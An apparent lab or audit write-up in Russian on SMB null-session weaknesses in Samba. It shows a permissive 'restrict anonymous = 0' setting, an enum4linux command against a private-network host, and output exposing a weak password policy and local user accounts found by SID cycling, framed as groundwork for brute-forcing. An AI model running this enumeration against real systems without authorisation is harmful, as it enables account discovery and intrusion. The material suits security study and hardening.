Механизм Нулевая сессия представляет собой конфигурационный недостаток в реализации службы IPC$ протокола SMB.
При отсутствии жестких ограничений он позволяет удаленному неавторизованному пользователю установить логическое соединение с сервером, используя пустые значения идентификаторов (username: '', password: '').
Через открытый анонимный RPC-канал нарушитель получает возможность провести агрессивный сбор данных.
Можно извлечь полный список локальных учетных записей методом перебора инкрементов идентификаторов безопасности , определить структуру сетевых разделов, а также считать параметры локальной политики паролей.


В конфигурационном файле /etc/samba/smb.conf уровень ограничений для анонимных запросов находится в режиме совместимости по умолчанию:
[global]
restrict anonymous = 0


Для сканирования RPC-интерфейсов целевого хоста без предоставления легитимных учетных данных используется утилита enum4linux:
enum4linux -a 192.168.1.21
В ходе выполнения аудита сервер успешно подтвердил установку пустой сессии и раскрыл внутреннюю архитектуру безопасности:
Верификация транспортного канала:
[+] Server 192.168.1.21 allows sessions using username '', password ''

Компрометация парольной политики (Раскрытие векторов брутфорса):
[+] Password Info for Domain: NEXTCLOUD-VICTIM
	[+] Minimum password length: 5
	[+] Account Lockout Threshold: None
	Password Complexity: Disabled

Полная компрометация структуры учетных записей:
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\vsftpd (Local User)
S-1-22-1-1001 Unix User\testuser (Local User)
S-1-22-1-1002 Unix User\ftpuser (Local User)
S-1-22-1-1005 Unix User\sftp_weak (Local User)

Вывод работы: Полученный массив данных позволяет злоумышленнику полностью исключить стадию угадывания логинов и построить оптимизированный вектор брутфорса, опираясь на считанные лимиты парольной политики.
